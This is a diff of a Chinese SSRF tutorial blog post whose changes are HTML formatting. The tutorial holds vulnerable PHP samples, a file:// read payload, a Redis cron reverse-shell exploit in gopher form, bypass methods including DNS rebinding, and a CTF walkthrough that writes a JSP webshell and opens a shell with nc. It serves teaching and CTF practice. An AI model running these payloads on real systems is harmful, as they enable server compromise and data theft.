@@ -291,7 +291,7 @@
                 
 
                 <blockquote>
-<p>本文首发于 FreeBuf <a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html" >https://www.freebuf.com/articles/web/333318.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>本文首发于 FreeBuf <a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">https://www.freebuf.com/articles/web/333318.html<i class="fas fa-external-link-alt"></i></a></p>
 </blockquote>
 <span id="more"></span>
 
@@ -314,7 +314,7 @@
 <h2 id="0x02-知其然：什么是-SSRF"><a href="#0x02-知其然：什么是-SSRF" class="headerlink" title="0x02 知其然：什么是 SSRF?"></a>0x02 知其然：什么是 SSRF?</h2><ul>
 <li>先挂一张生动的图</li>
 </ul>
-
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/SSRF.png" class>
 
 <p>攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 ……</p>
 <p>SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p>
@@ -340,18 +340,18 @@
 <h4 id="1-file-get-contents-与-readfile"><a href="#1-file-get-contents-与-readfile" class="headerlink" title="1. file_get_contents() 与 readfile()"></a>1. file_get_contents() 与 readfile()</h4><p><code>file_get_contents</code> 这一函数是把 <strong>传入的参数(变量)</strong> 写入字符串，当把 <strong>传参</strong> 是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/Fileget.png" class>
 <h4 id="2-fsockopen"><a href="#2-fsockopen" class="headerlink" title="2. fsockopen()"></a>2. fsockopen()</h4><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个 Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定 url 数据的获取。该函数会使用 socket 跟服务器建立 tcp 连接，进行传输原始数据。 fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用<code>（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）</code> 如果调用失败，将返回false。</p>
 <p>测试代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// ssrf.php</span><br><span class="line">&lt;?php</span><br><span class="line">$host=$_GET[&#x27;url&#x27;];</span><br><span class="line">$fp = fsockopen($host, 80, $errno, $errstr, 30);</span><br><span class="line">if (!$fp) &#123;</span><br><span class="line">    echo &quot;$errstr ($errno)&lt;br /&gt;\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $out = &quot;GET / HTTP/1.1\r\n&quot;;</span><br><span class="line">    $out .= &quot;Host: $host\r\n&quot;;</span><br><span class="line">    $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    while (!feof($fp)) &#123;</span><br><span class="line">        echo fgets($fp, 128);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发 ssrf 并返回百度主页，这种更像是一种重定向 (302) 之类的，没什么用。</p>
-
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/SSRFfsockopen.png" class>
 
 <h4 id="3-curl-exec"><a href="#3-curl-exec" class="headerlink" title="3. curl_exec()"></a>3. curl_exec()</h4><p>curl_init(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供 <code>curl_setopt()，curl_exec()和curl_close()</code> 函数使用。</p>
 <p>测试代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// ssrf.php</span><br><span class="line">&lt;?php </span><br><span class="line">if (isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">	$link = $_GET[&#x27;url&#x27;];</span><br><span class="line">	$curlobj = curl_init(); // 创建新的 cURL 资源</span><br><span class="line">	curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">	curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">	curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项</span><br><span class="line">	$result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器</span><br><span class="line">	curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源</span><br><span class="line"> </span><br><span class="line">	// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span><br><span class="line">	// file_put_contents($filename, $result); </span><br><span class="line">	echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发 ssrf 并返回百度主页：</p>
-
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/CurlFunction.png" class>
 
 <ul>
 <li>但是攻击方式不止这么一点，其实是可以通过其他方式提高 <code>curl_exec()</code> 这里的攻击危害的。</li>
@@ -371,17 +371,17 @@
 </ul>
 </li>
 </ul>
-<p><a href="">SSRF-Lab 搭建教程</a></p>
+<p><a href>SSRF-Lab 搭建教程</a></p>
 <h4 id="1-file-协议的利用"><a href="#1-file-协议的利用" class="headerlink" title="1. file 协议的利用"></a>1. file 协议的利用</h4><p>Payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/password  <span class="comment"># file:// 之后可以接任意文件</span></span><br></pre></td></tr></table></figure>
 <p>这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?url=file:///etc/password</span><br></pre></td></tr></table></figure>
 
 <p>而在 SSRF-Lab 当中较简单，在框中输入 <code>file:///etc/password</code> 即可。</p>
-
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/EasyFile.png" class>
 
 <h4 id="2-dict-协议的使用"><a href="#2-dict-协议的使用" class="headerlink" title="2. dict 协议的使用"></a>2. dict 协议的使用</h4><p>利用 <code>dict</code> 协议，<code>dict://ip/info</code> 可获取本地 <code>redis</code> 服务配置信息。</p>
-<p>如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server，具体可见 <a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7333#toc-4" >redis 与 dict 协议<i class="fas fa-external-link-alt"></i></a></p>
+<p>如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server，具体可见 <a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7333#toc-4">redis 与 dict 协议<i class="fas fa-external-link-alt"></i></a></p>
 <h4 id="3-gopher-协议的使用"><a href="#3-gopher-协议的使用" class="headerlink" title="3. gopher 协议的使用"></a>3. gopher 协议的使用</h4><p>首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h <span class="variable">$1</span> flushall</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\n\n&quot;</span>|redis-cli -h <span class="variable">$1</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> save</span><br><span class="line">//redis-cli查看所有的keys及清空所有的数据</span><br></pre></td></tr></table></figure>
 <p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于 <code>Gopher</code> 协议的 URL：</p>
@@ -390,7 +390,7 @@
 <p>经过url解码便是：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1 <span class="variable">$8</span> flushall *3 <span class="variable">$3</span> <span class="built_in">set</span> <span class="variable">$1</span> 1 <span class="variable">$64</span> */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 *4 <span class="variable">$6</span> config <span class="variable">$3</span> <span class="built_in">set</span> <span class="variable">$3</span> <span class="built_in">dir</span> <span class="variable">$16</span> /var/www/html/ *4 <span class="variable">$6</span> config <span class="variable">$3</span> <span class="built_in">set</span> <span class="variable">$10</span> dbfilename <span class="variable">$4</span> root *1 <span class="variable">$4</span> save quit</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/GopherUse.png" class>
 
 <h2 id="0x05-一些常见的绕过手法"><a href="#0x05-一些常见的绕过手法" class="headerlink" title="0x05 一些常见的绕过手法"></a>0x05 一些常见的绕过手法</h2><h4 id="1-绕过"><a href="#1-绕过" class="headerlink" title="1. @绕过"></a>1. @绕过</h4><p>URL的完整格式是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]</span><br></pre></td></tr></table></figure>
@@ -427,9 +427,9 @@
 <p><a href="https://drun1baby.github.io/2022/04/08/HackTheBox-baby-CachedView/">HackTheBox-baby-CachedView | 芜风 </a></p>
 <p>密码可以私聊我</p>
 <p>DNS 重绑的话，原理如图所示</p>
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/DnsRebinding.png" class>
 
-
-<p>工具网站如下<br><a class="link"   target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html" >https://lock.cmpxchg8b.com/rebinder.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>工具网站如下<br><a class="link" target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html<i class="fas fa-external-link-alt"></i></a></p>
 <p>简单叙述一下逻辑：</p>
 <p>1.判定你给的 IP 或者域名解析后的 IP 是否在黑名单中<br>2.若在，退出报错<br>3.若不在，再次访问你给的 IP 或者域名解析后的 IP；执行后续业务模块</p>
 <p>所以思路很简单：你只需要有个域名，但是它映射两个 IP；同时设置 TTL 为 0，能方便两个 IP 即刻切换。</p>
@@ -451,7 +451,7 @@
 <p>这里就建立了 Socket 请求，也就是网络请求，所以存在 SSRF。</p>
 <h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>Java SSRF 的攻击手段和 PHP 的类似，都是写入 shell，或者直接打 Redis 未授权，但是 PHP 的那个脚本，在 Java 里面用不了，所以这一块稍微总结一下写入 shell 的攻击手段。</p>
 <p>还是以 CTFShow 844 为例，要发包的接口是 &#x2F;goPage；两个参数 url 和 port。尝试访问 6379 端口，发现可行。尝试写 shell</p>
-
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/844Socket.png" class>
 
 <p>这里的 payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config= set dir /usr/local/tomcat/webapps/ROOT/&amp;config set dbfilename 1.jsp&amp;set xx &#x27;&lt;%Runtime.getRuntime().exec(new String[]&#123;&quot;sh&quot;,&quot;-c&quot;,request.getParameter(&quot;i&quot;)&#125;);%&gt;&#x27;&amp;save=&amp;quit=&amp;url=127.0.0.1&amp;port=6379</span><br></pre></td></tr></table></figure>
@@ -459,7 +459,7 @@
 <p>进行一下 url 编码之后打</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goPage?config=%20set%20dir%20/usr/local/tomcat/webapps/ROOT/&amp;config%20set%20dbfilename%201.jsp&amp;set%20xx%20&#x27;%3C%25Runtime.getRuntime().exec(new%20String%5B%5D%7B%22sh%22%2C%22-c%22%2Crequest.getParameter(%22i%22)%7D)%3B%25%3E&#x27;&amp;save=&amp;quit=&amp;url=127.0.0.1&amp;port=6379</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF/844WriteInShell.png" class>
 
 <p>然后完成弹 shell</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.jsp?i=nc xxx.xx.xx.xx 3333 -e /bin/sh</span><br></pre></td></tr></table></figure>
@@ -468,7 +468,7 @@
 <ul>
 <li>对于 CTF 选手来说，SSRF 的绕过手段，尤其是 DNS 重绑这个绕过方式挺厉害的，建议学习。</li>
 </ul>
-<h2 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262430" >https://www.anquanke.com/post/id/262430<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/" >https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7333" >https://xz.aliyun.com/t/7333<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260806.html" >https://www.freebuf.com/articles/web/260806.html<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262430">https://www.anquanke.com/post/id/262430<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7333">https://xz.aliyun.com/t/7333<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
